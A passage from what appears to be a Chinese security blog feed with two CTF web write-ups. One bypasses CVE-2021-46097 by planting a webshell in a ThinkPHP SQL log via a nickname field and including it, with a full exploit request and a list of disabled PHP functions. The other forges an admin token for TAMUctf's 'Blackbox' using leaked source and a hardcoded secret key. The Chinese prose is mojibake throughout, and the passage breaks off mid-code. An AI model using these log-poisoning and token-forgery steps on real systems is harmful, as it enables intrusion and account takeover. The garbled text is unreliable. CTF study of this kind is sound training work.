class="line">_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_waitp</span><br><span class="line">id,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_w</span><br><span class="line">exitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal_dispatch,pcntl_get_last_er</span><br><span class="line">ror,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_</span><br><span class="line">getpriority,pcntl_setpriority,imap_open,apache_setenv,putenv</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„â½¬æ ‡æ˜¯åŸºäº CVE-2021-46097 å†æ¬¡ç»•è¿‡å®ƒ</p><p>è¿™é‡Œçš„è¯å°±æ˜¯ä¸ªå°0dayäº†ï¼Œå¾—è‡ªå·±æŒ–åˆ©ç”¨é“¾äº†  <strong>(ç¬¬ä¸€æ¬¡é‡åˆ°å¾—è‡ªå·±æŒ–0dayçš„é¢˜)</strong></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹æ˜µç§°æ¥å®Œå…¨æ§åˆ¶ <strong>$details</strong>ï¼ˆæ­¤å¤„ä¸º get_nickname(UID)ï¼‰ã€‚action_name ä¸º â€œuser_editâ€ã€‚</p><p><img src="../images/image-20230506222438638.png" alt="image-20230506222438638"></p><p>ä¿®æ”¹åç§°</p><p><img src="../images/image-20230506222544278.png" alt="image-20230506222544278"></p><p>Thinkphp æ¡†æ¶åœ¨ Loader.php ä¸­å®šä¹‰äº†â¼€ä¸ªåä¸º include_file çš„å‡½æ•°</p><p><img src="../images/image-20230506222655072.png" alt="image-20230506222655072"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†think__include_fileä½œä¸ºç¬¬â¼€ä¸ªå‚æ•°ä¼ é€’ç»™call_user_funcã€‚</p><p>å¥‡æ€ªçš„æ˜¯ï¼Œthinkphpåœ¨./runtimeä¸‹è®°å½•äº†SQLâ½‡å¿—ï¼Œâ½½æˆ‘ä»¬åˆšæ‰åšçš„æ˜¯ä¿®æ”¹adminçš„æ˜µç§°ã€‚æ˜µç§°å…ˆè¢«æ‹¼æ¥æˆâ¼€æ¡SQLå‘½ä»¤ï¼Œç„¶åè®° å½•åˆ°â½‡å¿—ä¸­ã€‚</p><p><img src="../images/image-20230506225333824.png" alt="image-20230506225333824"></p><p><img src="../images/image-20230506225655306.png" alt="image-20230506225655306"></p><p>2.ç¼–è¾‘adminçš„æ˜µç§°ï¼Œä½¿â½‡å¿—â½‚ä»¶åŒ…å«æˆ‘ä»¬çš„webshellã€‚</p><p>3.æ“¦é™¤ç¼“å­˜ã€‚è¿™â¼€æ­¥æ˜¯å¿…é¡»çš„ï¼Œå¦åˆ™æ˜µç§°ä¸ä¼šæ›´æ–°ã€‚</p><p><img src="../images/image-20230506230530708.png" alt="image-20230506230530708"></p><p>å°†æ˜µç§°ç¼–è¾‘ä¸º../runtime/2023/05/01.logã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘é€è¿™æ ·çš„è¯·æ±‚æ¥æ‰§â¾PHPä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/admin/index/profile.html HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 114</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Referer: http://localhost/admin.php/admin/index/profile.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6;</span><br><span class="line">PHPSESSID=88h9tlthje0nfe2sod7c8v6e39</span><br><span class="line">Connection: close</span><br><span class="line">__token__=d8c89447445b0095fb569725f91f0505&amp;nickname=../runtime/log/202304/29.log</span><br><span class="line">&amp;email=&amp;password=&amp;mobile=&amp;avatar=0&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>æœ€åæ”¹å‘½ä»¤æ¥æ‹¿flagå°±è¡Œäº†</p><p><strong>éš¾åäº†</strong>   <strong>å±…ç„¶å¾—è‡ªå·±åˆ†ææºç æ¥æ‹¿é“¾å­</strong>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>è¿™é‡Œçš„è¯javaè¿˜æœ‰å¥½å¤šä¸œè¥¿æ²¡çœ‹  æ‰€ä»¥javaé¢˜å°±å…ˆä¸è¿›è¡Œå¤ç°äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> AntCTF x DÂ³CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TAMUctf 2023-web-å¤ç°</title>
      <link href="/posts/662b134b.html"/>
      <url>/posts/662b134b.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/tamuctf/tamuctf-2023/tree/master/web">å®˜æ–¹wpåœ°å€</a></p><p><a href="https://velog.io/@sani/TAMU-CTF-writeups">éŸ©å›½è€å¤–çš„wp</a></p><h2 id="Blackbox"><a href="#Blackbox" class="headerlink" title="Blackbox"></a>Blackbox</h2><p><img src="../images/image-20230501140913517.png" alt="image-20230501140913517"></p><p>è¿™é‡Œçš„è¯è®¿é—®ä¼šæŠ¥é”™ï¼Œå°±æ˜¯ä¸ªæ–‡ä»¶åŒ…å«ï¼Œç„¶åå¯ä»¥å°è¯•ç”¨ä¼ªåè®®è¿›è¡Œè¯»å–æ–‡ä»¶å†…å®¹</p><p><img src="../images/image-20230501141309538.png" alt="image-20230501141309538"></p><p>æ‰«ç›®å½•çš„æ—¶å€™å‘å…ˆgitæºç æ³„éœ²  äºæ˜¯ä½¿ç”¨githackå·¥å…·å»çœ‹èƒ½å¦è¯»å–åˆ°ä¸€äº›ä¸œè¥¿</p><p><img src="../images/image-20230501142033211.png" alt="image-20230501142033211"></p><p>è¯»å–åˆ°äº†æ–‡ä»¶ï¼Œç„¶åå¹¶ä¸‹è½½ä¸‹æ¥äº†</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$resource</span> = <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./util.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(INCLUDE_DIR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$resource</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>util.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_login</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT key FROM users WHERE username=:uname AND password=:passwd;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:passwd&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">try_auth</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$hash_password</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">db_login</span>(<span class="variable">$username</span>, <span class="variable">$hash_password</span>)-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_guest_token</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>)), <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_admin_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$user_key</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="variable">$user_key</span>, <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>)[<span class="number">0</span>]), <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_key</span> = <span class="variable">$data</span>[<span class="string">&#x27;user_key&#x27;</span>];</span><br><span class="line">    <span class="variable">$admin</span> = <span class="variable">$data</span>[<span class="string">&#x27;admin&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE username=:uname AND key=:ukey;&#x27;</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:ukey&#x27;</span>, <span class="variable">$user_key</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>() != <span class="literal">false</span> &amp;&amp; <span class="variable">$admin</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501142551816.png" alt="image-20230501142551816"></p><p>å› ä¸ºindex.phpé‡Œé¢æœ‰config.phpæ‰€ä»¥å°±ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹</p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">APP_NAME</span> = <span class="string">&#x27;Blackbox&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">INCLUDE_DIR</span> = <span class="string">&#x27;./templates/&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DB_FILE</span> = <span class="string">&#x27;../sqlite/site-data.db&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_guest_token</span>(), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">try_auth</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_admin_token</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="title function_ invoke__">end</span>(<span class="variable">$result</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;main&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">page</span>=<span class="title">login</span>&quot;, <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">username</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">submit</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">include</span>(<span class="title">INCLUDE_DIR</span> . &#x27;<span class="title">footer</span>.<span class="title">php</span>&#x27;); ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>]) || !<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=login&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">  &lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>); <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;footer.php&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢çš„ä»£ç å°±å¯ä»¥å‘ç°åªè¦<code>auth_token</code>èƒ½åˆ¤å®šä¸ºç®¡ç†å‘˜çš„è¯ï¼Œå°±å¯ä»¥è·³è½¬åˆ°?page=admin  </p><p>æ‰€ä»¥æ¥å…ˆå»loginé¡µé¢æ‹¿åˆ°cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Imd1ZXN0IiwidXNlcl9rZXkiOiJlZGEzNTBkYjFiNzk3NjRiIiwiYWRtaW4iOnRydWV9.fab86457458d9707b051bc8bb7619e8c</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œè§£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;user_key&quot;:&quot;eda350db1b79764b&quot;,&quot;admin&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ä¼ªé€ çš„è¯å°±å¾ˆå…³é”®äº†ï¼Œuser_keyçš„è¯è¦æˆåŠŸä¼ªé€ æˆadminçš„user_keyï¼Œæ‰€ä»¥gitæºç æ³„éœ²çš„æ•°æ®åº“å°±æœ‰ç”¨äº†</p><p><img src="../images/image-20230501143637851.png" alt="image-20230501143637851"></p><p>æŸ¥çœ‹è¿™ä¸ªæ•°æ®åº“å°±ä¼šå‘ç°æœ‰ä¸ªadminçš„user_key</p><p>ç„¶åè¿›è¡Œä¿®æ”¹ä½¿ç”¨</p><p>ç„¶åç»“åˆutil.phpé‡Œçš„ä»£ç è¿›è¡Œä½¿ç”¨</p><p>å°±æ˜¯ç”ŸæˆåŠ å¯†å­—ç¬¦ä¸²åé¢çš„ç­¾å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9.58fed7114a165282749650cf5458d31f&quot;</span>;</span><br><span class="line"><span class="title function_ 